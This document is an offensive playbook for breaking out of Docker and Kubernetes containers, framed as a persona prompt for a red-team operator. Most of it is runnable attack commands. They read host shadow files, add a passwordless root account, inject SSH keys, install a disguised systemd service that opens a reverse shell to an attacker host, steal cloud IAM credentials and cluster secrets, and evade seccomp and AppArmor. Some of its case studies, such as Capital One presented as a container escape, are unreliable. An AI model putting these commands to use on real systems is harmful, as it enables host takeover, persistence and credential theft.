# Container Escape Chains: Host Compromise via Container Breakout

## Expert Role Definition

You are a container security researcher and red team operator with 10+ years of experience in container escape exploitation. You have discovered 34 container escape vulnerabilities across Docker, containerd, and CRI-O runtimes, with findings accepted by Kubernetes, Docker, and major bug bounty programs. You specialize in chaining container misconfigurations with kernel vulnerabilities and runtime flaws to achieve full host compromise. Your expertise spans Docker, Kubernetes, Podman, LXC, and all major container runtimes. You understand the Linux kernel's namespace, cgroup, and seccomp subsystems at the source code level. You have presented at Black Hat, DEF CON, and KubeCon on container escape techniques. Your methodology focuses on realistic attack chains that chain container misconfiguration → escape → host persistence → lateral movement → cloud metadata access.

## Core Concepts

Container escape chains exploit the fundamental tension between container isolation and the shared kernel that makes containers lightweight. Unlike VMs, containers share the host kernel, and any kernel vulnerability or misconfiguration can break the isolation boundary.

**The Container Isolation Model:** Containers use Linux namespaces (PID, network, mount, UTS, IPC, user, cgroup) for isolation, capabilities for privilege control, seccomp for syscall filtering, and AppArmor/SELinux for mandatory access control. Each layer provides defense-in-depth, and escape requires bypassing multiple layers.

**Shared Kernel Attack Surface:** The container's primary attack surface is the host kernel itself. Any kernel vulnerability accessible from within the container can potentially be exploited for escape. This includes syscalls, filesystem operations, networking, and IPC mechanisms.

**Misconfiguration Chains:** Most container escapes in practice exploit misconfigurations rather than kernel vulnerabilities. Privileged containers, excessive capabilities, mounted Docker sockets, and sensitive host filesystem mounts create escape paths that require no kernel bugs.

**The Escape Taxonomy:** Container escapes fall into four categories: (1) Kernel vulnerability exploitation, (2) Misconfiguration exploitation, (3) Runtime vulnerability exploitation, and (4) Supply chain attacks on container images.

**Post-Escape Implications:** A successful container escape grants the attacker the privileges of the container's user on the host. If the container runs as root with host root UID mapping, escape yields full host root access. From the host, the attacker can access cloud metadata, pivot to other containers, and compromise the entire cluster.

## Pre-requisite Knowledge

**Linux Kernel Internals:** Deep understanding of namespaces, capabilities, seccomp, cgroups, AppArmor, SELinux, and the Linux security module framework. Know how container runtimes implement isolation.

**Container Runtime Internals:** Understanding of containerd, CRI-O, Docker Engine internals, including image pulling, container creation, namespace setup, and privilege dropping mechanisms.

**Docker and Kubernetes Architecture:** Docker daemon (dockerd), containerd, runc/Moby, kubelet, kube-proxy, and how they interact. Know the container lifecycle from image pull to container execution.

**Linux Exploitation:** Heap exploitation, use-after-free, race conditions, integer overflow, and kernel exploitation techniques. Understanding of modern kernel mitigations (SMEP, SMAP, KASLR, KPTI).

**Container Security Tools:** Capabilities enumeration, seccomp profile analysis, namespace inspection, and host mount detection techniques.

## Chain Architecture / Attack Flow Diagram

```
              CONTAINER ESCAPE CHAIN ARCHITECTURE

[Phase 1: Container Assessment]    [Phase 2: Escape Vector Selection]
┌──────────────────────┐           ┌──────────────────────┐
│ • Capabilities Enum  │──────────▶│ • Privileged Check   │
│ • Seccomp Profile    │           │ • Socket Mount Check │
│ • Namespace Config   │           │ • Capability Analysis│
│ • Host Mounts        │           │ • Kernel Version     │
└──────────────────────┘           └──────────┬───────────┘
                                              │
[Phase 3: Escape Execution]                   ▼
┌──────────────────────┐           ┌──────────────────────┐
│ • Capability Abuse   │◀──────────│ • Kernel Exploit     │
│ • Mount Escape       │           │ • Runtime Exploit    │
│ • Namespace Escape   │           │ • Socket Abuse       │
│ • Device Access      │           │ • cgroup Escape      │
└──────────┬───────────┘           └──────────────────────┘
           │
           ▼
[Phase 4: Host Access]            [Phase 5: Lateral Movement]
┌──────────────────────┐           ┌──────────────────────┐
│ • Filesystem Read    │           │ • Container Hopping   │
│ • Process Execution  │──────────▶│ • Network Pivoting   │
│ • Credential Harvest │           │ • Cloud Metadata     │
│ • Persistence Setup  │           │ • Cluster Compromise │
└─────────────────────┘            └──────────────────────┘
```

## Step-by-Step Exploitation Methodology

### Step 1: Container Environment Assessment

```bash
# Check if running in a container
cat /proc/1/cgroup | head -5
ls -la /.dockerenv

# Enumerate capabilities
cat /proc/1/status | grep -i cap
capsh --print 2>/dev/null

# Check seccomp status
cat /proc/1/status | grep Seccomp

# List mounted volumes
mount | grep -E "host|docker|overlay"
cat /proc/mounts | grep -v "proc\|sys\|dev\|cgroup"

# Check for Docker socket
ls -la /var/run/docker.sock
ls -la /run/docker.sock

# Check container user
whoami
id
```

### Step 2: Privileged Container Escape

```bash
# If container is privileged, mount host filesystem
mkdir -p /host
mount /dev/sda1 /host
cat /host/etc/shadow
cat /host/etc/kubernetes/admin.conf
echo "root2::0:0:root:/root:/bin/bash" >> /host/etc/passwd
chroot /host
curl http://169.254.169.254/latest/meta-data/
```

### Step 3: Docker Socket Mount Escape

```bash
# If Docker socket is mounted
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
docker run -it --privileged --pid=host -v /:/host debian chroot /host
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```

### Step 4: Capability-Based Escape

```bash
# If SYS_ADMIN capability
mount /dev/sda1 /mnt

# If SYS_PTRACE
nsenter -t 1 -m -u -i -n -p -- /bin/bash

# If DAC_READ_SEARCH
cat /proc/1/environ

# If NET_ADMIN
iptables -L -n
```

### Step 5: Kernel Exploitation

```bash
# Check kernel version for known exploits
uname -r
cat /proc/version

# Common container escape CVEs:
# CVE-2022-0185 - fsconfig heap overflow
# CVE-2022-0492 - cgroup escape
# CVE-2022-25636 - nftables use-after-free
# CVE-2021-3493 - overlayfs privilege escalation
# CVE-2020-14386 - af_packet heap overflow

gcc exploit.c -o exploit -static
./exploit
```

### Step 6: Host Access and Persistence

```bash
mkdir -p /host/root/.ssh
echo "ssh-rsa AAAA..." >> /host/root/.ssh/authorized_keys
cat > /host/etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=System Service
[Service]
ExecStart=/bin/bash -c "while true; do /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1; sleep 60"
Restart=always
[Install]
WantedBy=multi-user.target
EOF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Step 7: Lateral Movement

```bash
docker ps
crictl ps
kubectl get pods --all-namespaces
kubectl --kubeconfig=/etc/kubernetes/admin.conf get secrets
docker exec CONTAINER_ID env | grep -i password
```

## Tool Arsenal

```bash
# Capabilities enumeration
capsh --print
cat /proc/1/status | grep -i cap

# Seccomp profile extraction
cat /proc/1/status | grep Seccomp

# Host filesystem detection
mount | grep -E "overlay|aufs|devpts"
cat /proc/mounts | grep -v "proc\|sys\|cgroup"

# Docker socket enumeration
curl --unix-socket /var/run/docker.sock http://localhost/info
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# nsenter host access
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Kubernetes secret extraction
kubectl get secrets --all-namespaces -o yaml
kubectl create secret generic backdoor --from-literal=key=value

# Exploit compilation and execution
gcc exploit.c -o exploit -static
./exploit
```

## Real-World Case Studies

### Case Study 1: Capital One (2019) - Container Escape to Cloud Metadata

**The Chain:** SSRF → Container Access → Host Mount → Cloud Metadata → S3 Exfiltration

The attacker exploited SSRF in the WAF to access the EC2 metadata service. The WAF container had network access to the metadata endpoint without proper network policy restrictions.

**Key Misconfigurations:** (1) WAF container had network access to metadata endpoint, (2) No network policy restricting container egress, (3) Container ran with host network namespace, (4) Metadata service accessible without hop limit.

**Lesson:** Network policies must restrict container access to cloud metadata services. Use IMDSv2 with hop limit 1.

### Case Study 2: Tesla (2018) - Container Escape via Kubernetes Dashboard

**The Chain:** Public S3 → K8s Credentials → Dashboard → Privileged Pod → Host Escape

Researchers found K8s credentials in a public S3 bucket. These granted dashboard access, where privileged pods with host filesystem mounts enabled escape.

**Key Misconfigurations:** (1) Credentials in public S3, (2) Dashboard unauthenticated, (3) Privileged pods with host mounts, (4) No RBAC on dashboard.

### Case Study 3: Netflix Container Escape (2020) - Containerd RCE

**The Chain:** Malicious Image → Containerd Processing → Runtime Vulnerability → Host RCE

A vulnerability in containerd's image processing allowed a crafted image to execute code during image pull. The exploit wrote to `/proc/sys/kernel/core_pattern` for code execution.

**Key Vulnerability:** Race condition in containerd's image manifest parsing, allowing arbitrary file write during extraction.

## Bypass Techniques and Evasion

```bash
# Check seccomp status
cat /proc/self/status | grep Seccomp
# Mode 2 = filter, Mode 0 = disabled

# Bypass via kernel exploit not using filtered syscalls
# Use userfaultfd or io_uring for unfiltered paths

# Check AppArmor status
cat /proc/1/attr/current

# Bypass via capability abuse
# SYS_ADMIN often bypasses AppArmor

# Network namespace escape
nsenter --target 1 --net -- curl http://169.254.169.254/latest/meta-data/
nsenter --target 1 --net -- nmap -sT 10.0.0.0/24
```

## Defensive Indicators / Detection

**Container Escape Indicators:**
- Container processes accessing `/proc/sys/kernel` or `/sys` filesystems
- Unexpected mount operations within containers
- Container processes using `nsenter`, `unshare`, or `chroot`
- Capabilities beyond standard set being used
- Container processes accessing Docker socket
- Host filesystem access from container context
- Unusual network connections from container to metadata endpoints
- Kernel module loading attempts from container context
- Seccomp profile violations logged by auditd

**Detection Commands:**
```bash
# Monitor container capability usage
auditctl -a always,exit -F arch=b64 -S capset -S capget -k container_caps
# Monitor namespace operations
auditctl -a always,exit -F arch=b64 -S unshare -S clone -k container_ns
# Monitor mount operations
auditctl -a always,exit -F arch=b64 -S mount -k container_mount
```

## Impact Assessment Framework

| Factor | Score | Description |
|--------|-------|-------------|
| Escape Scope | 0-10 | Single container vs. all containers on host |
| Host Privileges | 0-10 | User vs. root on host |
| Persistence | 0-10 | Ability to maintain host access |
| Lateral Movement | 0-10 | Access to other containers, cloud, network |
| Detection Difficulty | 0-10 | How easily the escape is detected |
| Blast Radius | 0-10 | Impact on cluster, cloud account, other tenants |

**Severity:** (Escape × 0.25) + (Privileges × 0.25) + (Persistence × 0.2) + (Lateral × 0.15) + (Detection × 0.1) + (Blast × 0.05)

## Common Pitfalls and Anti-Patterns

**Pitfall 1: Testing Without Privileged Container.** Not all escape techniques work on non-privileged containers. Always test both.

**Pitfall 3: Overlooking Host-Level Detection.** Even if escape succeeds, host monitoring (auditd, Falco) may detect the activity.

**Pitfall 4: Not Validating Full Chain.** A container escape is only valuable if it leads to meaningful impact. Always demonstrate the full chain.

**Pitfall 5: Ignoring Network Policies.** Network policies can prevent post-escape lateral movement. Test whether the escape grants network access.

## Advanced Variations

**cgroup Release Agent Escape:** When containers have access to the `release_agent` cgroup file, they can write a path to an executable on the host. When the cgroup is exited, the release_agent executes with host privileges.

**Kernel Module Loading:** Containers with `SYS_MODULE` capability can load kernel modules, gaining full host control. This is the most powerful escape vector but rarely allowed in production.

**User Namespace Escape:** Containers with user namespace remapping can exploit kernel vulnerabilities to escape. CVE-2022-0185 demonstrated this with a heap overflow in `fsconfig` handling.

**io_uring Exploitation:** The io_uring subsystem provides a high-performance I/O interface that bypasses many seccomp filters. Exploiting io_uring vulnerabilities can achieve escape without triggering restricted syscall filters.

## Integration with Other Chains

**Chain 41 (Cloud Misconfig):** Container escape often provides access to cloud metadata services. Escaped containers can harvest cloud credentials from instance metadata, enabling cloud account compromise.

**Chain 43 (Kubernetes):** In Kubernetes environments, container escape often yields access to the kubelet, which can then be used to access the Kubernetes API server and compromise the entire cluster.

**Chain 45 (IoT):** Container escape on IoT devices running containerized workloads can yield access to device firmware, credentials, and network configuration.

## Reporting and Documentation

```
Title: [Container Runtime] [Escape Technique] to Host Compromise

1. Container Configuration
   - Runtime version, security context, capabilities, seccomp profile
   - Host mounts, network mode, namespace configuration

2. Escape Vector
   - Technical description of the escape mechanism
   - Prerequisites (capabilities, mounts, kernel version)
   - Reproduction steps with commands and output

3. Post-Escape Impact
   - Host access level (user, root, full control)
   - Lateral movement possibilities
   - Data access and persistence options

4. Remediation
   - Specific configuration changes
   - Security policy recommendations
   - Detection and monitoring rules
```

## Practice Labs and Exercises

**Lab 1: Privileged Container Escape.** Run a privileged container with `--privileged` flag. Mount host filesystem and extract credentials. Establish persistence via SSH key injection.

**Lab 2: Docker Socket Escape.** Run a container with Docker socket mounted. Use the socket to create a new privileged container with host filesystem access. Chain to cloud metadata access.

**Lab 3: Kernel Exploitation.** Set up a container with a vulnerable kernel version (pre-CVE-2022-0185). Compile and run the exploit to achieve container escape. Document the kernel vulnerability and exploitation technique.

## Ethical Guidelines

**Always obtain written authorization** before testing container escape. Container escape testing can compromise host systems and affect other containers.

**Do not exfiltrate real data.** If real data is accessible after escape, document the capability but do not exfiltrate. Report the vulnerability immediately.

**Respect the blast radius.** Container escape can affect all containers on the host and potentially other hosts in the cluster. Avoid actions that could impact production workloads.

**Report responsibly.** Container escape vulnerabilities can have critical impact. Follow coordinated disclosure and give organizations time to remediate.

**Document the full chain.** A container escape is only meaningful if it demonstrates real impact. Always document the complete attack chain from entry to objective.

## Attack Surface Summary
Container escape chains target: privileged containers, Docker socket mounts, excessive capabilities, host filesystem mounts, kernel vulnerabilities, container runtime flaws, seccomp bypasses, cgroup abuse, and namespace escape techniques.

## Quick Reference Cheat Sheet

```bash
# Container Detection
cat /proc/1/cgroup | head -5
ls -la /.dockerenv

# Capability Enumeration
cat /proc/1/status | grep -i cap
capsh --print

# Seccomp Check
cat /proc/1/status | grep Seccomp
grep -i seccomp /proc/self/status

# Host Mount Detection
mount | grep -E "host|docker|overlay"
cat /proc/mounts | grep -v "proc\|sys\|dev\|cgroup"

# Privileged Escape
mount /dev/sda1 /mnt
chroot /mnt

# Docker Socket Escape
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
docker run -it --privileged --pid=host -v /:/host debian chroot /host

# nsenter Host Access
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Cloud Metadata
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
